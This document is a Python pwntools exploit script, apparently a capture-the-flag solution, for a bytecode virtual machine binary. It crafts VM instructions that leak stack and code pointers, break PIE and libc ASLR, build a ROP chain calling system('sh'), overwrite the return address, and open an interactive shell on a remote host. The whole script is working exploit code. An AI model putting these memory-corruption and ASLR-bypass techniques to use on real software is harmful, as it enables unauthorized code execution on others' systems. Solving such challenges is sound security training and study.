#!/usr/bin/env python3.9
from pwn import *
BINARY='./simple_virtual_machine_C'
ICONST = 9
GSTORE = 13
STORE = 12
ISUB = 2
IADD = 1
LOAD = 10
GLOAD=11
STORE = 12
HALT = 18
POP = 15

def serialize(msg):
    return b''.join(p32(x) for x in msg)

# 1. leak stack (code pointer) to local variable
# 2. reconstruct code from local variable
# 3. create return address pointer
# 4. leak the content to local variable
# 5. use it to break PIE - finding read_ptr
# 6. use it break libc ASLR - finding read
# 7. use it to construct rop chain
# 8. override the return address

G_LEN = 0
G_ADDR_HIGH = 1
G_ADDR_LOW = 2
C_LEN = 3
C_ADDR_LOW = 5
RET_ADDR_HIGH = 6
RET_ADDR_LOW = 7
SYSTEM_FUNC_ADDR_LOW = 8
SYSTEM_FUNC_ADDR_HIGH = 9
READ_ADDR_LOW = 10
READ_ADDR_HIGH = 11
POP_RDI_LOW = 12
POP_RDI_HIGH = 13
        
# Now we have C_ADDR and the sp points to our absolute writer
START_MSG = [
        POP,                        # Pop globals length and pointer
        POP,
        POP,

        POP,                        # Pop struct alignment
        STORE, C_LEN,               # We must store this fields in order to
        STORE, RET_ADDR_HIGH,       # Recreate them - otherwise we will crash
        STORE, C_ADDR_LOW, 

        LOAD, C_ADDR_LOW, 
        LOAD, RET_ADDR_HIGH, 
        LOAD, C_LEN,
        ICONST, 0                   # Write struct alignment
        ]

# The return address of vm_exec stack is 40 bytes lower than the code buffer
RETURN_ADDRESS_OFFSET = 40


# RET_ADDR_LOW = C_ADDR_LOW - RETURN_ADDRESS_OFFSET
CREATE_RET_ADDR = [
        LOAD, C_ADDR_LOW,
        ICONST, RETURN_ADDRESS_OFFSET, 
        ISUB, 
        STORE, RET_ADDR_LOW
]

# Offset from main+226 (return address to read_ptr)
MAIN_RET_ADDR = 0x1d5d
POP_RDI_GADGET = 0x1df3
READ_PTR = 0x3fb8
libc = ELF("./libc-2.31.so")

GET_READ_ADDRESS = [
        LOAD, RET_ADDR_LOW,
        LOAD, RET_ADDR_HIGH,
        GLOAD, 0, # main_ret_addr = [(RET_ADDR_HIGH << 32) | RET_ADDR_LOW]

        # calculate read_ptr address
        ICONST, READ_PTR - MAIN_RET_ADDR,
        IADD,
        STORE, READ_ADDR_LOW,

        # calculate pop rdi gadget address
        GLOAD, 0,
        ICONST, 
        POP_RDI_GADGET - MAIN_RET_ADDR,
        IADD,
        STORE, POP_RDI_LOW,

        # We could have read this once but we have spare opcodes and it makes
        # the code more readable
        GLOAD, 1,
        STORE, READ_ADDR_HIGH,
        GLOAD, 1,
        STORE, POP_RDI_HIGH,

        # Clean the absolute write address
        POP,
        POP,

        # Deref read_ptr to get the libc address of the read function
        LOAD, READ_ADDR_LOW,
        LOAD, READ_ADDR_HIGH,
        GLOAD, 0,
        ICONST, libc.symbols["read"] - libc.symbols["system"],
        ISUB,
        STORE, SYSTEM_FUNC_ADDR_LOW,
        GLOAD, 1,
        STORE, SYSTEM_FUNC_ADDR_HIGH,

        # clean the absolute write address
        POP,
        POP,
]
        
        
# Our vm rop chain
OVERRIDE_RET_ADDR = [
        # Start at the vm_exec return address
        LOAD, RET_ADDR_LOW,
        LOAD, RET_ADDR_HIGH,

        # Insert a "ret" gadget (pop_rdi_gadget+1) to align the stack as needed
        # by AMD64 ABI (rsp & ~0xf == rsp)
        LOAD, POP_RDI_LOW,
        ICONST, 1,
        IADD,
        GSTORE, 0,
        LOAD, POP_RDI_HIGH,
        GSTORE, 1,

        # Insert POP RDI Gadget
        LOAD, POP_RDI_LOW, 
        GSTORE, 2,
        LOAD, POP_RDI_HIGH,
        GSTORE, 3,

        # Address to sh string down in the stack
        LOAD, RET_ADDR_LOW, 
        ICONST, 32,
        IADD,
        GSTORE, 4,
        LOAD, RET_ADDR_HIGH,
        GSTORE, 5,


        # Insert "system" address
        LOAD, SYSTEM_FUNC_ADDR_LOW,
        GSTORE, 6,
        LOAD, SYSTEM_FUNC_ADDR_HIGH,
        GSTORE, 7,

        # "sh\x00\x00\x00..."
        ICONST, 0x00006873,
        GSTORE, 8,
        ]

# To prevent a crash in vm_print_data we set globals_len to zero here and halt
# nicely
STOP_PROGRAM = [ICONST, 0, HALT]

# Construct the entire code
MSG = START_MSG + CREATE_RET_ADDR + GET_READ_ADDRESS + OVERRIDE_RET_ADDR + STOP_PROGRAM


print(f"[*] We send {len(MSG)}")
assert len(MSG) <= 128, len(MSG)
MSG = MSG + (128 - len(MSG)) * [0]
#r = process(["./simple_virtual_machine_C"])
r = remote('47.243.140.252', 1337)
r.send(serialize(MSG))
r.interactive()
